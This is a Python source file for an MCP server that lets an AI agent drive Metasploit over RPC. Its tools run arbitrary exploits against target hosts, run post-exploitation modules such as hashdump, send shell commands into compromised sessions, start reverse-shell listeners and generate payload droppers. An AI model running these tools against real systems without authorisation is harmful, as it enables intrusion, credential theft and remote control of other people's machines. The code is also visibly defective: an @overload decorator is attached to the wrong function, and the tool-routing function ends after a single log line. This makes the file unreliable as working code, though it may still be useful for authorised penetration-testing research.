#!/usr/bin/env python3
"""
SOCIS-AI-PT — Metasploit MCP Server (HTTP transport)
HTTP bridge to Metasploit Framework RPC server.
Based on: https://github.com/GH05TCREW/MetasploitMCP

Configuration using environment variables:
    MSF_HOST: Metasploit RPC host (default: 127.0.0.1)
    MSF_PORT: Metasploit RPC port (default: 55553)
    MSF_PASSWORD: Metasploit RPC password (required)
    MSF_SSL: Use SSL/TLS for RPC connection (default: false)
    PAYLOAD_SAVE_DIR: Directory to save generated payloads (default: ~/payloads)
"""

import json
import asyncio
import inspect
import re
import httpx
import os
import uvicorn
import logging
import msgpack
import redis as redis_client
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from typing import Any, Awaitable, Dict, Optional, TypeVar, overload
from mcp_auth import verify_mcp_auth, mcp_auth_error

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="SOCIS Metasploit MCP Server", docs_url=None)

MCP_VERSION = "1.0"

# ---------------------------------------------------------------------------
# Session-open detection helpers
# ---------------------------------------------------------------------------
# MSF prints one of these when a session actually opens:
#   [*] Meterpreter session 1 opened (192.168.x.x:4444 -> ...)
#   [*] Command shell session 1 opened (...)
#   [*] Session 1 created in the background.
# And uid= appears in shell output after 'id' runs automatically.
_SESSION_OPEN_RE = re.compile(
    r"(meterpreter session \d+ opened"
    r"|command shell session \d+ opened"
    r"|session \d+ (opened|created)"
    r"|uid=\d+\()"
    , re.IGNORECASE,
)

# Lines that contain "session" but mean NO session
_SESSION_FAIL_RE = re.compile(
    r"(no session was created"
    r"|session may not have been created"
    r"|exploit completed.*no session"
    r"|no sessions)"
    , re.IGNORECASE,
)


def _msf_session_opened(output: str) -> bool:
    """Return True only if MSF output contains a real session-open confirmation."""
    if _SESSION_FAIL_RE.search(output):
        return False
    return bool(_SESSION_OPEN_RE.search(output))
SERVER_NAME = "metasploit-mcp"

# ─── Metasploit RPC Configuration ──────────────────────────────────────
# Read from environment variables (following official MetasploitMCP pattern)
MSF_HOST = os.getenv("MSF_HOST", os.getenv("METASPLOIT_SERVER", "127.0.0.1"))
MSF_PORT = int(os.getenv("MSF_PORT", os.getenv("METASPLOIT_PORT", "55553")))
MSF_PASSWORD = os.getenv("MSF_PASSWORD", "")
MSF_SSL = os.getenv("MSF_SSL", "false").lower() == "true"
PAYLOAD_SAVE_DIR = os.getenv("PAYLOAD_SAVE_DIR", os.path.expanduser("~/payloads"))

# Build RPC URL
METASPLOIT_SCHEME = "https" if MSF_SSL else "http"
METASPLOIT_URL = f"{METASPLOIT_SCHEME}://{MSF_HOST}:{MSF_PORT}"

logger.info(f"Metasploit RPC configured at: {METASPLOIT_URL}")
if not MSF_PASSWORD:
    logger.warning("⚠️  MSF_PASSWORD not set! RPC authentication may fail.")

# ─── Redis Session Storage ───────────────────────────────────────────
REDIS_URL = os.getenv("REDIS_URL")
if not REDIS_URL:
    raise ValueError("REDIS_URL environment variable is required")
_redis = None

def get_redis():
    global _redis
    if _redis is None:
        _redis = redis_client.from_url(REDIS_URL, decode_responses=True)
    return _redis

MSF_SESSIONS_KEY = "metasploit:sessions"
_T = TypeVar("_T")


@overload

def _check_msf_targets(value) -> None:
    """SSRF/scope guard (fix H-5) for RHOSTS / target_host. Accepts a single
    host, CIDR, or a comma/space-separated list; each entry is validated."""
    from mcp_auth import validate_scan_target
    if not value:
        return
    for part in re.split(r"[,\s]+", str(value).strip()):
        if part:
            validate_scan_target(part.split("/")[0])


async def _resolve(value: Awaitable[_T]) -> _T:
    ...


@overload
async def _resolve(value: _T) -> _T:
    ...


async def _resolve(value: Awaitable[_T] | _T) -> _T:
    """Resolve sync values and awaitables transparently for Redis compatibility."""
    if inspect.isawaitable(value):
        return await value
    return value

async def store_session(session_data: dict) -> str:
    """Store session in Redis and return session_id."""
    import time
    session_id = str(int(time.time() * 1000))
    session_data["session_id"] = session_id
    session_data["created_at"] = time.time()
    
    r = get_redis()
    await _resolve(r.hset(MSF_SESSIONS_KEY, session_id, json.dumps(session_data)))
    await _resolve(r.sadd(f"{MSF_SESSIONS_KEY}:active", session_id))
    return session_id

async def get_stored_sessions() -> list:
    """Get all stored sessions from Redis."""
    r = get_redis()
    session_ids_result: Any = r.smembers(f"{MSF_SESSIONS_KEY}:active")
    if inspect.isawaitable(session_ids_result):
        session_ids_result = await session_ids_result
    session_ids = session_ids_result or set()
    sessions = []
    for sid in session_ids:
        data: Any = r.hget(MSF_SESSIONS_KEY, sid)
        if inspect.isawaitable(data):
            data = await data
        if data:
            sessions.append(json.loads(data))
    return sessions

async def remove_session(session_id: str) -> bool:
    """Remove session from Redis."""
    r = get_redis()
    sid = str(session_id)
    await _resolve(r.srem(f"{MSF_SESSIONS_KEY}:active", sid))
    await _resolve(r.hdel(MSF_SESSIONS_KEY, sid))
    return True


def _coerce_session_id(session_id: Any) -> Optional[int]:
    """Best-effort conversion for session IDs coming from JSON/tool args."""
    try:
        sid = int(session_id)
        return sid if sid >= 0 else None
    except Exception:
        return None


async def _get_session_type(session_id: int) -> Optional[str]:
    """Resolve Metasploit session type (e.g., shell, meterpreter) from session.list."""
    result = await msf_rpc_call("session.list", [])
    sessions = result if isinstance(result, dict) else {}
    info = sessions.get(str(session_id)) or sessions.get(session_id)
    if not isinstance(info, dict):
        return None
    stype = str(info.get("type", "")).strip().lower()
    return stype or None

# ─── MCP Tool Definitions ──────────────────────────────────────────────
TOOLS = [
    {
        "name": "list_exploits",
        "description": "Search and list available Metasploit exploit modules by keyword, CVE, platform, or service.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "query": {
                    "type": "string",
                    "description": "Search term: vulnerability name, CVE ID, platform, or service (e.g., 'ms17_010', 'windows', 'smb')"
                },
                "type": {
                    "type": "string",
                    "description": "Filter by module type",
                    "enum": ["exploit", "auxiliary", "post", "payload"],
                    "default": "exploit"
                },
                "platform": {
                    "type": "string",
                    "description": "Filter by target platform",
                    "enum": ["windows", "linux", "android", "unix", "osx", "apple_ios", "bsd", "solaris", "hpux", "aix", "netware", "freebsd", "openbsd", "chrome", "nodejs", "java", "python", "ruby", "php", "unixware", "irix", "digital_unix", "cisco", "firefox", "mysql", "postgresql", "mssql", "oracle", "http", "ssh", "ftp", "telnet", "smb", "dns", "ldap", "rdp", "vnc", "pop3", "imap", "nntp", "mongodb", "elasticsearch"],
                    "default": "windows"
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum number of results to return",
                    "default": 20
                }
            },
            "required": ["query"]
        }
    },
    {
        "name": "list_all_exploits",
        "description": "List all Metasploit exploit modules using direct console (more reliable).",
        "inputSchema": {
            "type": "object",
            "properties": {
                "platform": {
                    "type": "string",
                    "description": "Filter by platform",
                    "enum": ["windows", "linux", "unix", "osx", "android", "bsd", "solaris", "multi", "all"],
                    "default": "windows"
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum results",
                    "default": 50
                }
            },
            "required": ["platform"]
        }
    },
    {
        "name": "list_auxiliary_modules",
        "description": "List all Metasploit auxiliary modules (scanners, fuzzers, brute-forcers, denial of service).",
        "inputSchema": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "description": "Auxiliary category to list",
                    "enum": ["scanner", "spoof", "admin", "dos", "fuzzers", "gather", "sniffer", "pdf", "voip"],
                    "default": "scanner"
                },
                "service": {
                    "type": "string",
                    "description": "Filter by service type",
                    "enum": ["http", "smb", "ssh", "ftp", "telnet", "mysql", "postgresql", "mssql", "oracle", "vnc", "rdp", "dns", "ldap", "smtp", "pop3", "imap", "snmp", "cisco", "firewall", "winrm", "wmi", "nfs", "mongodb", "elasticsearch"],
                    "default": "http"
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum number of results",
                    "default": 30
                }
            },
            "required": ["category"]
        }
    },
    {
        "name": "list_exploit_modules",
        "description": "List all Metasploit exploit modules (remote, local, privilege escalation).",
        "inputSchema": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "description": "Exploit category",
                    "enum": ["remote", "local", "priv", "priviledge_escalation", "web", "dos"],
                    "default": "remote"
                },
                "platform": {
                    "type": "string",
                    "description": "Target platform",
                    "enum": ["windows", "linux", "unix", "osx", "android", "bsd", "solaris", "java", "python", "php", "ruby", "nodejs"],
                    "default": "windows"
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum number of results",
                    "default": 30
                }
            },
            "required": ["category"]
        }
    },
    {
        "name": "list_post_modules",
        "description": "List all Metasploit post-exploitation modules.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "description": "Post-exploitation category",
                    "enum": ["gather", "escalate", "persist", "dump", "enum", "exfil", "privesc", "lateral_movement", "collection", " Recon"],
                    "default": "gather"
                },
                "os": {
                    "type": "string",
                    "description": "Target OS",
                    "enum": ["windows", "linux", "unix", "osx", "android", "multi"],
                    "default": "windows"
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum number of results",
                    "default": 30
                }
            },
            "required": ["category"]
        }
    },
    {
        "name": "list_payloads",
        "description": "List available Metasploit payload modules with optional platform and architecture filtering.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "query": {
                    "type": "string",
                    "description": "Search term (e.g., 'meterpreter', 'staged', 'reverse')"
                },
                "platform": {
                    "type": "string",
                    "description": "Target platform",
                    "enum": ["windows", "linux", "android", "unix", "osx", "bsd", "solaris", "java", "python", "php", "ruby", "nodejs"],
                    "default": "windows"
                },
                "arch": {
                    "type": "string",
                    "description": "Architecture",
                    "enum": ["x86", "x64", "x86_64", "armle", "aarch64", "mipsle", "mipsbe", "ppc", "ppc64", "sparc", "java", "python", "dalvik"],
                    "default": "x86"
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum number of results to return",
                    "default": 20
                }
            }
        }
    },
    {
        "name": "get_module_info",
        "description": "Get detailed information about a specific Metasploit module including description, options, required settings, and targets.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "module_path": {
                    "type": "string",
                    "description": "Full module path (e.g., 'exploit/multi/handler', 'exploit/windows/smb/ms17_010_eternalblue', 'auxiliary/scanner/smb/smb_version')"
                }
            },
            "required": ["module_path"]
        }
    },
    {
        "name": "run_exploit",
        "description": (
            "Configure and execute any Metasploit exploit against a target. "
            "Runs as a background job (exploit -j) so the handler stays alive "
            "even when the exploit component times out. Automatically detects "
            "incompatible payloads and falls back to a compatible one."
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "exploit_path": {
                    "type": "string",
                    "description": (
                        "Full exploit module path. Examples: "
                        "'exploit/windows/smb/ms17_010_eternalblue', "
                        "'exploit/multi/http/drupal_drupageddon', "
                        "'exploit/unix/ftp/vsftpd_234_backdoor', "
                        "'exploit/unix/ftp/proftpd_modcopy_exec', "
                        "'exploit/multi/http/struts2_content_type_ognl', "
                        "'exploit/linux/http/nostromo_code_exec'. "
                        "Any valid MSF exploit path is accepted."
                    )
                },
                "target_host": {
                    "type": "string",
                    "description": "RHOSTS — target IP address or hostname"
                },
                "target_port": {
                    "type": "integer",
                    "description": "RPORT — target port (leave unset to use the module default)"
                },
                "payload": {
                    "type": "string",
                    "description": (
                        "Payload module path. If incompatible with the exploit, "
                        "a compatible payload is chosen automatically. Examples: "
                        "'windows/x64/meterpreter/reverse_tcp', "
                        "'linux/x86/meterpreter/reverse_tcp', "
                        "'php/meterpreter/reverse_tcp', "
                        "'cmd/unix/reverse_netcat', "
                        "'cmd/unix/reverse_bash', "
                        "'generic/shell_reverse_tcp'. "
                        "Any valid MSF payload path is accepted."
                    )
                },
                "lhost": {
                    "type": "string",
                    "description": "LHOST — your listening IP (attacker machine reachable by target)"
                },
                "lport": {
                    "type": "integer",
                    "description": "LPORT — your listening port"
                },
                "options": {
                    "type": "object",
                    "description": (
                        "Additional module options as key-value pairs. "
                        "Use this for module-specific options like TARGETURI, "
                        "USERNAME, PASSWORD, DBNAME, FILEPATH, etc. "
                        "Example: {\"TARGETURI\": \"/drupal/\", \"RPORT\": \"80\"}"
                    ),
                    "default": {}
                },
                "check_first": {
                    "type": "boolean",
                    "description": "Run the module's check command before exploiting to verify vulnerability",
                    "default": False
                }
            },
            "required": ["exploit_path", "target_host"]
        }
    },
    {
        "name": "run_auxiliary_module",
        "description": "Run any Metasploit auxiliary module (scanner, brute-forcer, fuzzer, admin) with custom options.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "module_path": {
                    "type": "string",
                    "description": (
                        "Full auxiliary module path. Examples: "
                        "'auxiliary/scanner/smb/smb_version', "
                        "'auxiliary/scanner/ssh/ssh_login', "
                        "'auxiliary/scanner/http/http_version', "
                        "'auxiliary/scanner/ftp/ftp_login', "
                        "'auxiliary/scanner/mysql/mysql_version', "
                        "'auxiliary/scanner/portscan/tcp', "
                        "'auxiliary/scanner/smb/smb_enumshares', "
                        "'auxiliary/scanner/snmp/snmp_enum', "
                        "'auxiliary/scanner/rdp/rdp_scanner'. "
                        "Any valid MSF auxiliary path is accepted."
                    )
                },
                "rhosts": {
                    "type": "string",
                    "description": "RHOSTS — target host(s), IP range, or CIDR"
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options as key-value pairs (e.g. {\"RPORT\": \"22\", \"USER_FILE\": \"/path/users.txt\"})",
                    "default": {}
                }
            },
            "required": ["module_path", "rhosts"]
        }
    },
    {
        "name": "run_post_module",
        "description": "Execute post-exploitation modules against existing sessions.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "module_path": {
                    "type": "string",
                    "description": (
                        "Post module path. Examples: "
                        "'post/windows/gather/hashdump', "
                        "'post/windows/gather/enum_logged_on_users', "
                        "'post/linux/gather/enum_configs', "
                        "'post/multi/gather/env', "
                        "'post/multi/recon/local_exploit_suggester'. "
                        "Any valid MSF post module path is accepted."
                    )
                },
                "session_id": {
                    "type": "integer",
                    "description": "Active MSF session ID to run post module against"
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options as key-value pairs",
                    "default": {}
                }
            },
            "required": ["module_path", "session_id"]
        }
    },
    {
        "name": "list_active_sessions",
        "description": "Show all current Metasploit sessions with detailed information (session ID, type, payload, target).",
        "inputSchema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "send_session_command",
        "description": "Run a shell command in an active shell or Meterpreter session.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {
                    "type": "integer",
                    "description": "Active session ID"
                },
                "command": {
                    "type": "string",
                    "description": "Command to execute in the session shell"
                },
                "wait_ms": {
                    "type": "integer",
                    "description": "Delay before reading output buffer (milliseconds)",
                    "default": 900
                },
                "max_reads": {
                    "type": "integer",
                    "description": "Maximum read polls after command write",
                    "default": 4
                }
            },
            "required": ["session_id", "command"]
        }
    },
    {
        "name": "terminate_session",
        "description": "Forcefully end an active session.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {
                    "type": "integer",
                    "description": "Session ID to terminate"
                }
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "generate_payload",
        "description": "Generate a payload file using Metasploit RPC (saves locally to PAYLOAD_SAVE_DIR).",
        "inputSchema": {
            "type": "object",
            "properties": {
                "payload": {
                    "type": "string",
                    "description": "Payload module",
                    "enum": ["windows/meterpreter/reverse_tcp", "windows/meterpreter/reverse_https", "windows/meterpreter/bind_tcp", "windows/x64/meterpreter/reverse_tcp", "windows/x64/meterpreter/reverse_https", "linux/x86/meterpreter/reverse_tcp", "linux/x64/meterpreter/reverse_tcp", "python/meterpreter/reverse_tcp", "php/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp", "android/meterpreter/reverse_tcp", "apple_ios/meterpreter/reverse_tcp"],
                    "default": "windows/meterpreter/reverse_tcp"
                },
                "format": {
                    "type": "string",
                    "description": "Output format",
                    "enum": ["exe", "elf", "raw", "python", "ruby", "c", "go", "java", "dll", "msi", "ps1", "vba"],
                    "default": "exe"
                },
                "lhost": {
                    "type": "string",
                    "description": "LHOST - callback/reverse connection host"
                },
                "lport": {
                    "type": "integer",
                    "description": "LPORT - callback/reverse connection port"
                },
                "options": {
                    "type": "object",
                    "description": "Additional payload options as key-value pairs",
                    "default": {}
                }
            },
            "required": ["payload", "format", "lhost", "lport"]
        }
    },
    {
        "name": "list_listeners",
        "description": "Show all active Metasploit handlers and background jobs.",
        "inputSchema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "start_listener",
        "description": "Create a new multi/handler to receive reverse connections from payloads.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "payload": {
                    "type": "string",
                    "description": (
                        "Payload type matching what the target will send back. "
                        "Examples: 'windows/x64/meterpreter/reverse_tcp', "
                        "'linux/x86/meterpreter/reverse_tcp', "
                        "'php/meterpreter/reverse_tcp', "
                        "'cmd/unix/reverse_netcat', "
                        "'generic/shell_reverse_tcp'. "
                        "Must match the payload used when generating the dropper."
                    )
                },
                "lhost": {
                    "type": "string",
                    "description": "LHOST — listening IP (your attacker machine)"
                },
                "lport": {
                    "type": "integer",
                    "description": "LPORT — listening port"
                }
            },
            "required": ["payload", "lhost", "lport"]
        }
    },
    {
        "name": "stop_job",
        "description": "Terminate any running job or handler by job ID.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "job_id": {
                    "type": "integer",
                    "description": "Job ID to terminate"
                }
            },
            "required": ["job_id"]
        }
    }
]


# ─── RPC Communication Functions ────────────────────────────────────────

# Cached auth token — refreshed on expiry
_msf_auth_token: Optional[str] = None


def _decode_msgrpc(data: Any) -> Any:
    """Recursively decode byte-string keys/values returned by Metasploit msgpack."""
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    if isinstance(data, dict):
        return {_decode_msgrpc(k): _decode_msgrpc(v) for k, v in data.items()}
    if isinstance(data, list):
        return [_decode_msgrpc(i) for i in data]
    return data


async def _msf_login() -> str:
    """Authenticate to Metasploit MSGRPC and return an auth token."""
    payload = msgpack.packb(["auth.login", "msf", MSF_PASSWORD], use_bin_type=True)
    headers = {"Content-Type": "binary/message-pack"}

    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.post(
            f"{METASPLOIT_URL}/api/v1/",
            content=payload,
            headers=headers,
        )
        result = _decode_msgrpc(msgpack.unpackb(response.content, raw=True, strict_map_key=False))

    if result.get("result") == "success":
        token = result.get("token", "")
        logger.info("Metasploit RPC authenticated successfully")
        return token

    raise RuntimeError(f"Metasploit auth failed: {result}")


async def msf_rpc_call(method: str, arguments: Optional[list] = None) -> Any:
    """
    Make an authenticated call to the Metasploit MSGRPC server using msgpack.

    The MSGRPC wire format is a msgpack array:
        [method_name, auth_token, arg1, arg2, ...]
    Login is the only exception — no token is needed for auth.login itself.
    """
    global _msf_auth_token

    if arguments is None:
        arguments = []

    try:
        # Obtain (or reuse) auth token
        if _msf_auth_token is None:
            _msf_auth_token = await _msf_login()

        # Build msgpack request: [method, token, *args]
        msg = [method, _msf_auth_token] + arguments
        payload = msgpack.packb(msg, use_bin_type=True)
        headers = {"Content-Type": "binary/message-pack"}

        async with httpx.AsyncClient(timeout=30.0) as client:
            logger.debug(f"MSGRPC Call: {method} args={arguments}")
            response = await client.post(
                f"{METASPLOIT_URL}/api/v1/",
                content=payload,
                headers=headers,
            )

        if response.status_code not in [200, 201]:
            raise RuntimeError(f"RPC HTTP {response.status_code}")

        result = _decode_msgrpc(msgpack.unpackb(response.content, raw=True, strict_map_key=False))

        # Token expired — re-login once and retry
        if isinstance(result, dict) and result.get("error_code") == 401:
            logger.info("Token expired, re-authenticating...")
            _msf_auth_token = await _msf_login()
            msg[1] = _msf_auth_token
            payload = msgpack.packb(msg, use_bin_type=True)
            async with httpx.AsyncClient(timeout=30.0) as client:
                response = await client.post(
                    f"{METASPLOIT_URL}/api/v1/",
                    content=payload,
                    headers=headers,
                )
            result = _decode_msgrpc(msgpack.unpackb(response.content, raw=True, strict_map_key=False))

        return result

    except httpx.ConnectError as e:
        error = {
            "error": "Cannot reach Metasploit RPC server",
            "details": str(e),
            "host": MSF_HOST,
            "port": MSF_PORT,
            "help": "Make sure msfrpcd is running: msfrpcd -P <password> -a 0.0.0.0 -p 55553",
        }
        logger.error(json.dumps(error, indent=2))
        return error


async def msf_run_via_console(module_type: str, module_name: str, options: dict, timeout: int = 120) -> str:
    """
    Run a Metasploit module through the console API so we can capture real output.
    module.execute only returns job_id (fire-and-forget); the console approach
    lets us poll console.read until the module finishes and collect all output.
    """
    create_result = await msf_rpc_call("console.create", [{}])
    console_id = str(create_result.get("id", "0"))
    collected: list[str] = []

    try:
        # Flush the initial MSF banner so it doesn't pollute our output
        await asyncio.sleep(1.5)
        await msf_rpc_call("console.read", [console_id])

        # Select the module
        full_path = f"{module_type}/{module_name}"
        await msf_rpc_call("console.write", [console_id, f"use {full_path}\n"])
        await asyncio.sleep(0.5)

        # Set PAYLOAD first so that payload-level options (LHOST, LPORT) are
        # recognised correctly and don't trigger "Unknown datastore option" warnings.
        if "PAYLOAD" in options:
            await msf_rpc_call("console.write", [console_id, f"set PAYLOAD {options['PAYLOAD']}\n"])
            await asyncio.sleep(0.3)

        # Set remaining options (skip PAYLOAD — already set above)
        for key, val in options.items():
            if key == "PAYLOAD":
                continue
            await msf_rpc_call("console.write", [console_id, f"set {key} {val}\n"])
            await asyncio.sleep(0.1)

        # Speed boost — THREADS is only valid for auxiliary/scanner modules, not exploits
        if module_type in ("auxiliary", "scanner"):
            await msf_rpc_call("console.write", [console_id, "set THREADS 10\n"])
            await asyncio.sleep(0.1)

        # Execute — blocking run (not -j background job)
        await msf_rpc_call("console.write", [console_id, "run\n"])

        # Poll until console is idle (module done) or timeout
        deadline = asyncio.get_event_loop().time() + timeout
        idle_streak = 0
        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(2)
            read_result = await msf_rpc_call("console.read", [console_id])
            data = read_result.get("data", "") if isinstance(read_result, dict) else ""
            busy = read_result.get("busy", False) if isinstance(read_result, dict) else False
            if data:
                collected.append(data)
                idle_streak = 0
                # Break early when a real session is confirmed — console won't go idle.
                # Use _msf_session_opened() to avoid matching failure messages like
                # "no session was created" that also contain the word "session".
                if _msf_session_opened("".join(collected)):
                    await asyncio.sleep(1)
                    extra = await msf_rpc_call("console.read", [console_id])
                    if isinstance(extra, dict) and extra.get("data"):
                        collected.append(extra["data"])
                    break
            if not busy:
                idle_streak += 1
                if idle_streak >= 2 and collected:
                    break
            else:
                idle_streak = 0

    finally:
        try:
            await msf_rpc_call("console.destroy", [console_id])
        except Exception:
            pass

    return "".join(collected)


async def msf_run_exploit_job(
    module_type: str,
    module_name: str,
    options: dict,
    timeout: int = 180,
    sessions_before: set | None = None,
) -> str:
    """
    Run a Metasploit EXPLOIT as a background job (`exploit -j`) so the multi/handler
    stays alive even when the exploit component itself aborts early (e.g.
    'Failure executing payload' due to HTTP timeout while PHP is blocking on
    the reverse-shell connection).

    Flow:
      1. Load module + set options in a fresh console
      2. Issue `exploit -j`  → handler starts as persistent background listener
      3. Poll BOTH console output AND session.list every cycle:
           • session-opened in console OR new session in session.list → break immediately
           • "no session was created" in console → 20 s grace period for delayed connects
           • 30 s of console silence → stop wasting cycles (let post-call check decide)
      4. Return all collected output
    """
    create_result = await msf_rpc_call("console.create", [{}])
    console_id = str(create_result.get("id", "0"))
    collected: list[str] = []
    _sessions_before = sessions_before if sessions_before is not None else set()

    try:
        # Flush MSF banner
        await asyncio.sleep(1.5)
        await msf_rpc_call("console.read", [console_id])

        full_path = f"{module_type}/{module_name}"
        await msf_rpc_call("console.write", [console_id, f"use {full_path}\n"])
        await asyncio.sleep(0.5)

        # PAYLOAD must be set first
        if "PAYLOAD" in options:
            await msf_rpc_call("console.write", [console_id, f"set PAYLOAD {options['PAYLOAD']}\n"])
            await asyncio.sleep(0.3)

        for key, val in options.items():
            if key == "PAYLOAD":
                continue
            await msf_rpc_call("console.write", [console_id, f"set {key} {val}\n"])
            await asyncio.sleep(0.1)

        # Background job — handler outlives the exploit component
        await msf_rpc_call("console.write", [console_id, "exploit -j\n"])

        # Give MSF a moment to start the job and print the job-ID line
        await asyncio.sleep(2)

        # Poll console AND session.list every cycle.
        #
        # With `exploit -j` the console goes SILENT quickly — the exploit job
        # output is detached. We cannot rely solely on console text; we must
        # also poll session.list to detect sessions that opened after the
        # console went idle. We stop early when:
        #   (a) session confirmed in console or session.list
        #   (b) grace period expired after "no session" line
        #   (c) console has been silent for 30 s (idle_silent_cycles >= 10)
        #       — the post-call session.list check will handle the rest
        deadline = asyncio.get_event_loop().time() + timeout
        grace_deadline: float | None = None   # set after "no session" line
        idle_silent_cycles = 0               # consecutive cycles with no console data

        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(3)
            read_result = await msf_rpc_call("console.read", [console_id])
            data = read_result.get("data", "") if isinstance(read_result, dict) else ""

            if data:
                collected.append(data)
                idle_silent_cycles = 0
                combined = "".join(collected)

                # Session confirmed in console → stop immediately
                if _msf_session_opened(combined):
                    await asyncio.sleep(1)
                    extra = await msf_rpc_call("console.read", [console_id])
                    if isinstance(extra, dict) and extra.get("data"):
                        collected.append(extra["data"])
                    break

                # Exploit component failed — keep handler alive for 20 s more
                if "no session was created" in combined.lower() and grace_deadline is None:
                    grace_deadline = asyncio.get_event_loop().time() + 20
            else:
                idle_silent_cycles += 1

            # Also check session.list directly — covers the case where the
            # session opens but the console is already silent
            sl_raw = await msf_rpc_call("session.list", [])
            if isinstance(sl_raw, dict) and "error" not in sl_raw:
                new_ids = set(sl_raw.keys()) - _sessions_before
                if new_ids:
                    # Append a synthetic line so the caller's regex also fires
                    collected.append(f"\n[*] session.list detected new session(s): {list(new_ids)}\n")
                    break

            # Grace period expired → stop waiting
            if grace_deadline and asyncio.get_event_loop().time() >= grace_deadline:
                break

            # Console has been silent for ~30 s — the job is likely done and
            # the session (if any) will be caught by the post-call check
            if idle_silent_cycles >= 10:
                break

    finally:
        try:
            # Small delay before destroying so any last-second session messages
            # are flushed from the console buffer
            await asyncio.sleep(2)
            await msf_rpc_call("console.destroy", [console_id])
        except Exception:
            pass

    return "".join(collected)


def _parse_msf_module_list(output: str, module_prefix: str = "") -> list[str]:
    """
    Parse 'show <modules>' console output and extract module paths.

    MSF format has a leading row number:
        0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average  ...
    So we scan each whitespace-split token to find the one containing '/'.
    """
    modules: list[str] = []
    for line in output.split("\n"):
        stripped = line.strip()
        if not stripped:
            continue
        for token in stripped.split():
            if "/" in token and (not module_prefix or token.startswith(module_prefix)):
                # Exclude leftover URL-like tokens (http://, file://, etc.)
                if "://" not in token:
                    modules.append(token)
                    break
    return modules


async def msf_list_modules_via_console(module_type: str, limit: int = 30) -> str:
    """
    List modules using console commands (show commands).
    More reliable than module.search which seems broken.

    Note: MSF uses plural forms — 'show exploits', 'show payloads', etc.
    'show auxiliary' and 'show post' are already correct.
    """
    # MSF console requires plural forms for exploit/payload
    _cmd_map = {
        "exploit":  "exploits",
        "payload":  "payloads",
        "payloads": "payloads",
        "exploits": "exploits",
    }
    show_cmd = _cmd_map.get(module_type, module_type)

    create_result = await msf_rpc_call("console.create", [{}])
    # If RPC is unreachable, msf_rpc_call returns an error dict (no "id" key)
    if "error" in create_result and "id" not in create_result:
        return f"[ERROR] Cannot connect to Metasploit RPC: {create_result.get('error')} — {create_result.get('help', '')}"

    console_id = str(create_result.get("id", "0"))
    collected: list[str] = []

    try:
        # Flush the MSF banner
        await asyncio.sleep(2)
        await msf_rpc_call("console.read", [console_id])

        command = f"show {show_cmd}\n"
        await msf_rpc_call("console.write", [console_id, command])

        # Poll until idle — 'show exploits' can take 5-30s for 2000+ modules
        deadline = asyncio.get_event_loop().time() + 60
        idle_streak = 0
        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(2)
            read_result = await msf_rpc_call("console.read", [console_id])
            data = read_result.get("data", "") if isinstance(read_result, dict) else ""
            busy = read_result.get("busy", False) if isinstance(read_result, dict) else False
            if data:
                collected.append(data)
                idle_streak = 0
            if not busy:
                idle_streak += 1
                if idle_streak >= 2 and collected:
                    break
            else:
                idle_streak = 0

        return "".join(collected)

    finally:
        try:
            await msf_rpc_call("console.destroy", [console_id])
        except Exception:
            pass


async def _msf_check_module(module_type: str, module_name: str, options: dict, timeout: int = 30) -> str:
    """Run the MSF `check` command for a module and return its output."""
    create_result = await msf_rpc_call("console.create", [{}])
    console_id = str(create_result.get("id", "0"))
    collected: list[str] = []
    try:
        await asyncio.sleep(1.5)
        await msf_rpc_call("console.read", [console_id])
        await msf_rpc_call("console.write", [console_id, f"use {module_type}/{module_name}\n"])
        await asyncio.sleep(0.4)
        if "PAYLOAD" in options:
            await msf_rpc_call("console.write", [console_id, f"set PAYLOAD {options['PAYLOAD']}\n"])
            await asyncio.sleep(0.2)
        for key, val in options.items():
            if key == "PAYLOAD":
                continue
            await msf_rpc_call("console.write", [console_id, f"set {key} {val}\n"])
            await asyncio.sleep(0.1)
        await msf_rpc_call("console.write", [console_id, "check\n"])
        deadline = asyncio.get_event_loop().time() + timeout
        idle_streak = 0
        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(2)
            read_result = await msf_rpc_call("console.read", [console_id])
            data = read_result.get("data", "") if isinstance(read_result, dict) else ""
            busy = read_result.get("busy", False) if isinstance(read_result, dict) else False
            if data:
                collected.append(data)
                idle_streak = 0
            if not busy:
                idle_streak += 1
                if idle_streak >= 2 and collected:
                    break
            else:
                idle_streak = 0
    finally:
        try:
            await msf_rpc_call("console.destroy", [console_id])
        except Exception:
            pass
    return "".join(collected)


async def handle_tool(tool_name: str, arguments: dict) -> Any:
    """
    Route tool calls to appropriate RPC methods.
    
    Tool names follow the pattern from official MetasploitMCP:
    https://github.com/GH05TCREW/MetasploitMCP
    """
    
    logger.info(f"Tool call: {tool_name}")

